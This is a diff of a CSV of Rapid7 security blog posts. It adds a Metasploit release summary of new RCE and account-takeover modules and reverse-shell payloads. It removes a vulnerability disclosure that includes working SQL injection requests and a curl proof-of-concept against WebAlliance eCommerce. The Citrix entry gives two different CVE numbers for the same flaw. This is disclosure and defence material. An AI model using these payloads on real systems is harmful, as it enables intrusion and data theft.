@@ -1,4 +1,289 @@
 ID,Story,Date,Category,Vendor,Source,Modules,Type,Title,Link,Context,Full Text
+e5bead7ace5b,e5bead7ace5b,2026-11-06 13:52 UTC,Vulnerabilities & Patching,Rapid7,Rapid7 Blog,Network Security; Vulnerability Management; Identity Security Posture Management,Article,Metasploit Wrapup: Unauth RCE modules in Network Perimeter Devices and much more,https://www.rapid7.com/blog/post/pt-metasploit-wrapup-unauth-rce-modules-in-network-perimeter-devices-and-much-more,"Lastly, if you're ever on an engagement or at home doing some testing and you see something that's not supported in Metasploit-Framework that you'd like to see supported, either...","Buckle up Metasploit-Framework enthusiasts because we have another action packed release for you. I'm talking, unauthenticated remote code execution modules in some of the biggest names in network perimeter devices like Citrix NetScaler and Cisco Secure Email Gateway. That's not all, we have an authenticated GitLab CI/CD regular expression integer overflow RCE module that was recently making head lines among many other awesome exploit modules. Looking for auxiliary modules? We've got you covered this release with a Flowise authentication bypass and a OpenBullet2 NTLMv2 hash disclosure, because who doesn't love collecting and cracking (or in some cases relaying) NTLM hashes am I right or am I right? In our continued effort to expand the payloads supported by the framework this week we saw fetch payload support for LoongArch. Lastly, if you're ever on an engagement or at home doing some testing and you see something that's not supported in Metasploit-Framework that you'd like to see supported, either drop us suggested-features issue on GitHub or trying throwing up a Pull Request, we'd love to hear from you. Happy hacking everyone!
+
+New module content (13)
+
+Flowise Authentication Bypass
+
+Authors: Arthur Gervais, Isaac David, and Richard Howe
+
+Type: Auxiliary
+
+Pull request: #21757 contributed by rmhowe425
+
+Path: admin/http/flowise_auth_bypass_cve_2025_58434
+
+CVE reference: CVE-2025-58434
+
+Description: Adds a new auxiliary module that exploits CVE-2025-58434, an unauthenticated account takeover in Flowise versions 3.0.5 and earlier. Flowise's password reset API returns a valid reset token directly in its response, so the module can reset the password of any account whose email address is known, with no credentials needed.
+
+SPIP Password Change IDOR Privilege Escalation
+
+Authors: 0xkidz and Julien Voisin
+
+Type: Auxiliary
+
+Pull request: #21865 contributed by jvoisin
+
+Path: admin/http/spip_idor_password_reset
+
+Description: This adds an auxiliary module which exploits a vulnerability in SPIP before 4.4.23 which allows attackers to change any user's password given a validly-signed POST without checking that the caller is authorized for that id_auteur. This issue was patched in 4.4.23 although no CVE has been assigned at the time of writing.
+
+HashiCorp Consul Version Scanner
+
+Author: h00die
+
+Type: Auxiliary
+
+Pull request: #22010 contributed by h00die
+
+Path: scanner/http/hashicorp_consul_version
+
+Description: Adds Hashicorp Consul version scanner.
+
+OpenBullet2 NTLMv2 Hash Disclosure via UNC Path Proxy Source
+
+Author: Maksim Rogov
+
+Type: Auxiliary
+
+Pull request: #21541 contributed by vognik
+
+Path: scanner/http/openbullet2_unauth_hash_disclosure_cve_2026_39908
+
+CVE reference: CVE-2026-39908
+
+Description: This adds two new modules targeting unauthenticated vulnerabilities in OpenBullet2. CVE-2026-25856: A Remote Code Execution (RCE) exploit that abuses the plain C# execution mode to run arbitrary .NET APIs and access the file system. CVE-2026-39908: A credential disclosure scanner for Windows that forces the app to reveal the NTLMv2 hash by loading a malicious UNC path. Both vulnerabilities affect OpenBullet2 releases starting from version 0.2.5.
+
+Citrix NetScaler Unauthenticated Login Log Command Injection (CVE-2026-88771)
+
+Authors: CERT-EU, Scyrix LLC, sfewer-r7, and watchTowr
+
+Type: Exploit
+
+Pull request: #21962 contributed by sfewer-r7
+
+Path: freebsd/http/citrix_netscaler_cve_2026_88771
+
+CVE reference: CVE-2026-88773
+
+Description: This adds in an exploit module for the recent Citrix NetScaler unauth RCE via command injection (CVE-2026-88771), that was reported as being exploited in the wild by the vendor prior to public disclosure.
+
+Portainer Authenticated Docker API Remote Root
+
+Author: Aman Singh Gill (Gill-Singh-A)
+
+Type: Exploit
+
+Pull request: #21745 contributed by Gill-Singh-A
+
+Path: linux/http/portainer_authenticated_docker_rce
+
+Description: Adds an exploit module that uses valid Portainer credentials and access to a managed Docker environment to create a privileged container, bind-mount the host filesystem, and execute a native Linux or Unix command payload as root on the underlying Docker host. The module optionally pulls the required container image and removes temporary containers after payload execution.
+
+Linux ELF Executable Payload Injection Persistence
+
+Author: dledda-r7
+
+Type: Exploit
+
+Pull request: #21839 contributed by dledda-r7
+
+Path: linux/persistence/elf
+
+Description: This adds a new Linux ELF injector persistence module supporting x86, x64, and AArch64 architectures to enable payload injection and persistence. The tool uses code cave and segment injection techniques alongside architecture-specific trampolines to seamlessly preserve original execution flow.
+
+GitLab CI/CD RegExp Integer Overflow Remote Code Execution
+
+Authors: Jonah Burgess, jheysel-r7, and joaxcar
+
+Type: Exploit
+
+Pull request: #22017 contributed by jheysel-r7
+
+Path: multi/http/gitlab_cicd_regexp_rce_cve_2026_97229
+
+CVE reference: CVE-2026-97229
+
+Description: Adds an exploit module for CVE-2026-97229, an integer overflow in GitLab’s CI/CD regular expression compiler that can lead to remote command execution as the git user. The module targets affected official GitLab CE/EE Linux amd64 releases, requires credentials with write access to a public project, and uses the unauthenticated CI lint API for payload delivery. Temporary branches and personal access tokens are automatically removed after exploitation.
+
+OpenBullet2 Unauthenticated RCE via Config Configuration Interface
+
+Author: Maksim Rogov
+
+Type: Exploit
+
+Pull request: #21541 contributed by vognik
+
+Path: multi/http/openbullet2_unauth_rce_cve_2026_25856
+
+CVE reference: CVE-2026-25856
+
+Description: This adds two new modules targeting unauthenticated vulnerabilities in OpenBullet2. CVE-2026-25856: A Remote Code Execution (RCE) exploit that abuses the plain C# execution mode to run arbitrary .NET APIs and access the file system. CVE-2026-39908: A credential disclosure scanner for Windows that forces the app to reveal the NTLMv2 hash by loading a malicious UNC path. Both vulnerabilities affect OpenBullet2 releases starting from version 0.2.5.
+
+Cisco Secure Email Gateway S/MIME SQL Injection RCE
+
+Author: sfewer-r7
+
+Type: Exploit
+
+Pull request: #22018 contributed by sfewer-r7
+
+Path: unix/smtp/cisco_secure_email_gateway_smime_sqli_rce
+
+CVE reference: CVE-2026-76443
+
+Description: This module exploits a SQLi for unauthenticated RCE as root against Cisco Secure Email Gateway. The Cisco advisories are vague, however we have reason to believe this maps to CVE-2026-76443.
+
+WordPress Bug Library Plugin Prior To 2.1.1 Unauthenticated PHP File Upload RCE
+
+Authors: Bob Matyas and TrinityBerserker
+
+Type: Exploit
+
+Pull request: #21716 contributed by TrinityBerserker
+
+Path: unix/webapp/wp_bug_library_file_upload
+
+CVE reference: CVE-2024-5450
+
+Description: Adds a new exploit module for CVE-2024-5450, an unauthenticated arbitrary PHP file upload vulnerability in the WordPress Bug Library plugin before version 2.1.1 that can lead to remote code execution.
+
+FTP, HTTP, HTTPS, SHELL, SHELL_BIND_TCP, SHELL_REVERSE_TCP and TFTP Fetch, Linux Chmod
+
+Authors: Brendan Watters, Spencer McIntyre, and bcoles [email protected]
+
+Type: Payload (Adapter)
+
+Pull request: #21954 contributed by bwatters-r7
+
+Description: This PR adds loongarch64 shell payloads and adds the required configs to get them to work with fetch payloads.
+
+This adapter adds the following payloads:
+
+cmd/linux/ftp/loongarch64/chmod
+
+cmd/linux/ftp/loongarch64/exec
+
+cmd/linux/ftp/loongarch64/reboot
+
+cmd/linux/ftp/loongarch64/shell/bind_tcp
+
+cmd/linux/ftp/loongarch64/shell/reverse_tcp
+
+cmd/linux/ftp/loongarch64/shell_bind_tcp
+
+cmd/linux/ftp/loongarch64/shell_reverse_tcp
+
+cmd/linux/http/loongarch64/chmod
+
+cmd/linux/http/loongarch64/exec
+
+cmd/linux/http/loongarch64/reboot
+
+cmd/linux/http/loongarch64/shell/bind_tcp
+
+cmd/linux/http/loongarch64/shell/reverse_tcp
+
+cmd/linux/http/loongarch64/shell_bind_tcp
+
+cmd/linux/http/loongarch64/shell_reverse_tcp
+
+cmd/linux/https/loongarch64/chmod
+
+cmd/linux/https/loongarch64/exec
+
+cmd/linux/https/loongarch64/reboot
+
+cmd/linux/https/loongarch64/shell/bind_tcp
+
+cmd/linux/https/loongarch64/shell/reverse_tcp
+
+cmd/linux/https/loongarch64/shell_bind_tcp
+
+cmd/linux/https/loongarch64/shell_reverse_tcp
+
+cmd/linux/tftp/loongarch64/chmod
+
+cmd/linux/tftp/loongarch64/exec
+
+cmd/linux/tftp/loongarch64/reboot
+
+cmd/linux/tftp/loongarch64/shell/bind_tcp
+
+cmd/linux/tftp/loongarch64/shell/reverse_tcp
+
+cmd/linux/tftp/loongarch64/shell_bind_tcp
+
+cmd/linux/tftp/loongarch64/shell_reverse_tcp
+
+linux/loongarch64/shell_bind_tcp
+
+linux/loongarch64/shell_reverse_tcp
+
+linux/loongarch64/shell/bind_tcp
+
+linux/loongarch64/shell/reverse_tcp
+
+SMB Fetch, Windows AArch64 Command Execution
+
+Authors: Alexander ""xaitax"" Hagenah, Spencer McIntyre, alanfoster, and vinicius-batistella
+
+Type: Payload (Adapter)
+
+Pull request: #21914 contributed by vinicius-batistella
+
+Description: Previously, selecting an AARCH64 Windows dll payload ended in what appeared to be success, but the generated payload was x86, not AARCH64. This Added an AARCH64 Windows DLL template and hooks up the payload generation to use it.
+
+This adapter adds the following payloads:
+
+cmd/windows/smb/aarch64/exec
+
+cmd/windows/smb/aarch64/shell/reverse_tcp
+
+cmd/windows/smb/aarch64/shell_reverse_tcp
+
+Enhancements and features (3)
+
+#21477 from M4nu02 - Adds Windows support to the Docker Image Persistence module, enabling Meterpreter sessions on Windows hosts running Docker Desktop to create a persistent Alpine container with access to the host’s C: drive.
+
+#21824 from bwatters-r7 - This adds rubocop rules to catch when a contributor redeclares a pre-existing option and guides them to simply change that option's default value. It still allows contributors to deregister and then re-register options that are different, but have the same key value.
+
+#22068 from cgranleese-r7 - Performs a routine update of multiple docker runtime dependencies.
+
+Bugs fixed (8)
+
+#21312 from msutovsky-r7 - Fixes a bug where a post modules can call the cleanup method twice.
+
+#22009 from 4n33sh - Fixes duplicate target prefixes in MySQL login scanner.
+
+#22027 from kx7m2qd - Replaces the deprecated Rex::Socket::Udp#sendto with send(mesg, flags, host, port) at all 12 call sites in the TFTP library and modules.
+
+#22039 from cgranleese-r7 - Improves how remote users are initially created in the remote msfdb HTTP service.
+
+#22052 from Yeagerist0 - Fixes duplicate peer:port prefixes in login scanners that include Msf::Exploit::Remote::Tcp.
+
+#22058 from Yeagerist0 - Fixes duplicate peer:port prefixes in the Redis login scanner.
+
+#22060 from Yeagerist0 - Fixes duplicate peer:port prefixes in the Telnet login scanner.
+
+#22061 from Yeagerist0 - Fixes a bug in varnish_cli_login consistently crashing with NoMethodError.
+
+Documentation added (1)
+
+#21967 from ZainnQureshii - This fixes 5 module documentation files that listed an incorrect default value for a datastore option. These have all been resolved and now all documentation in the framework lists the correct default value of their corresponding datastore option.
+
+You can always find more documentation on our docsite at docs.metasploit.com.
+
+Get it
+
+As always, you can update to the latest Metasploit Framework with msfupdate and you can get more details on the changes since the last blog post from GitHub:
+
+Pull Requests 6.5.8...6.5.9
+
+Full diff 6.5.8...6.5.9
+
+If you are a git user, you can clone the Metasploit Framework repo (master branch) for the latest. To install fresh without using git, you can use the open-source-only Nightly Installers or the commercial edition Metasploit Pro"
 6305e416c902,6305e416c902,2026-11-05 14:00 UTC,Vulnerabilities & Patching,Rapid7,Rapid7 Blog,Vulnerability Management; Attack Path Prediction; AI Security,Article,Gartner Report: The Attack Path is Closing Faster than Most Teams Can Patch,https://www.rapid7.com/blog/post/ai-gartner-report-attack-paths-closing-faster-than-patchable,"Rapid7’s vulnerability management capabilities support this operational path by bringing attack-surface visibility, threat intelligence, business context, and attack-path...","Security teams have never lacked vulnerability data. The harder problem is deciding which issues create a credible path to business impact, then acting before that path can be used. As frontier AI makes it faster and less expensive to connect weaknesses, operational assumptions, and legitimate system behavior, that decision window is becoming even tighter.
 
 The Gartner® report, Mythos Reprioritizes Cybersecurity Outcomes and Investments, examines what this shift means for cybersecurity priorities and investment. Rapid7 is offering complimentary access to the research, which we believe can help security leaders reassess how they prioritize exposure and infrastructure teams reassess how they plan response and recovery.
@@ -2406,60 +2691,3 @@ May 28, 2026: ZCS 10.1.17 fixed CVE-2026-73571.
 June 1, 2026: Zimbra requested an embargo on publication until the planned ZCS 10.1.18 release in September.
 
 June 16 and July 7, 2026: ZCS 10.1.18 and 10.1.19 were released without additional fixes from th [truncated for CSV - full text is in the JSON export]"
-dac935bc9c93,dac935bc9c93,2026-10-14 12:47 UTC,Vulnerabilities & Patching,Rapid7,Rapid7 Blog,Vulnerability Management; Server & Workload Protection,Article,Unauthenticated SQL Injection In Channel Software WebAlliance eCommerce,https://www.rapid7.com/blog/post/ve-unauthenticated-sql-injection-in-channel-software-weballiance-ecommerce,"Overview While performing continuous red teaming exercises through Rapid7’s Vector Command service, Rapid7 discovered CVE-2026-108065, an SQL Injection vulnerability (CWE-89) in...","Overview
-
-While performing continuous red teaming exercises through Rapid7’s Vector Command service, Rapid7 discovered CVE-2026-108065, an SQL Injection vulnerability (CWE-89) in Channel Software WebAlliance eCommerce.The exploit allows a malicious actor to read sensitive data from the database, or, if the database user has high privileges, run system commands on the database server. The vulnerability, scored as CVSSv3.1 9.8 (Critical).
-
-Product Description
-
-WebAlliance eCommerce by Channel Software is an all-in-one B2B e-commerce, digital catalog, and customer portal platform purpose-built for wholesale distributors and industrial manufacturers.
-
-Impact
-
-The SQL Injection exploit can be leveraged to view sensitive information in the database, such as user PII and passwords. If logged in with DB admin privileges, the vulnerability can be exploited to run system commands on the server running the database.
-
-Credit
-
-This vulnerability was discovered by Marcus Chang, Security Consultant at Rapid7 and is being disclosed in accordance with Rapid7's vulnerability disclosure policy.
-
-CVE-2026-108065 - Unauthenticated SQL Injection
-
-Technical Details
-
-Rapid7 exploited the vulnerability during blackbox testing and was unable to perform root cause analysis.The sUserID parameter in the GetUser method in a SOAP request to /preapproval.asmx doesn’t properly escape the user supplied sUserID. The SQL query can be escaped by inserting a single quote in the parameter. The database is running Microsoft SQL Server which allows for stacked queries. The query can be escaped with ( ‘; ) to inject completely new SQL commands.
-
-POST /preapproval.asmx HTTP/2 Host: {target_site} User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Soapaction: http://tempuri.org/GetUser Content-Type: text/xml;charset=UTF-8 Content-Length: 377 <soapenv:Envelope xmlns:soapenv=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:tem=""http://tempuri.org/""> <soapenv:Header/> <soapenv:Body> <tem:GetUser> <!--type: string--> <tem:sUserID>90'; { INJECT_MSSQL_STATEMENT_HERE } ;--</tem:sUserID> </tem:GetUser> </soapenv:Body> </soapenv:Envelope>
-
-If a single quote inserted, the SQL server will fail to parse the query and return a syntax error in the HTTP response:
-
-HTTP/2 200 OK Cache-Control: private, max-age=0 Content-Type: text/xml; charset=utf-8 Server: Microsoft-IIS/10.0 X-Frame-Options: SAMEORIGIN P3p: CP=""Potato"" Date: { Date } Content-Length: 440 <?xml version=""1.0"" encoding=""utf-8""?><soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema""><soap:Body><GetCustomerResponse xmlns=""http://tempuri.org/""><GetCustomerResult>Incorrect syntax near 'ZZZ'. Unclosed quotation mark after the character string ''.</GetCustomerResult></GetCustomerResponse></soap:Body></soap:Envelope>
-
-Information can be extracted using time based SQL injection payloads. For example, a query can be injected to force the database to sleep for 2 seconds if the database user is a sysadmin:
-
-POST /preapproval.asmx HTTP/2 Host: {target_site} User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Soapaction: http://tempuri.org/GetUser Content-Type: text/xml;charset=UTF-8 Content-Length: 377 <soapenv:Envelope xmlns:soapenv=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:tem=""http://tempuri.org/""> <soapenv:Header/> <soapenv:Body> <tem:GetUser> <!--type: string--> <tem:sUserID>90';IF IS_SRVROLEMEMBER('sysadmin') = 1 WAITFOR DELAY '00:00:02';-- </tem:sUserID> </tem:GetUser> </soapenv:Body> </soapenv:Envelope>
-
-If the database user is sysadmin, SQL Ole Automation can be used to upload a file.
-
-If the database is running from the same server as the web application, ASPX files can be uploaded. They can then be browsed to run their code and perform system commands on the server.
-
-Proof-of-Concept (POC) Example:
-
-Curl POC:
-
-curl --path-as-is -i -s -k -X $'POST' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Soapaction: http://tempuri.org/GetCustomer' -H $'Content-Type: text/xml;charset=UTF-8' \ --data-binary $'<soapenv:Envelope xmlns:soapenv=\""http://schemas.xmlsoap.org/soap/envelope/\"" xmlns:tem=\""http://tempuri.org/\"">\x0d\x0a <soapenv:Header/>\x0d\x0a <soapenv:Body>\x0d\x0a <tem:GetCustomer>\x0d\x0a <!--type: string-->\x0d\x0a <tem:sCustID>90\'; { YOUR_SQL_STATEMENT_HERE } ;-- </tem:sCustID>\x0d\x0a </tem:GetCustomer>\x0d\x0a </soapenv:Body>\x0d\x0a</soapenv:Envelope>' \ $'https://{target_host}/preapproval.asmx'
-
-Remediation
-
-Block access to /preapproval.asmx.
-
-Disclosure Timeline
-
-July 13 2026: Issue discovered by Marcus Chang, and exploitation reported to the Vector Command customer.
-
-August 28, 2026: Initial contact with Channel Software.
-
-September 8, 15, and 29, 2026: Follow up email sent to Channel Software to confirm initial contact and provide details of the correct channel to share the details of the vulnerability.
-
-October 9, 2026: Follow up email sent to Channel Software informing them of public disclosure on October 14 and assignment of CVE, along with a request for a vendor statement. Rapid7 received no response from Channel Software.
-
-October 14, 2026: Public disclosure via publication of this blog post."
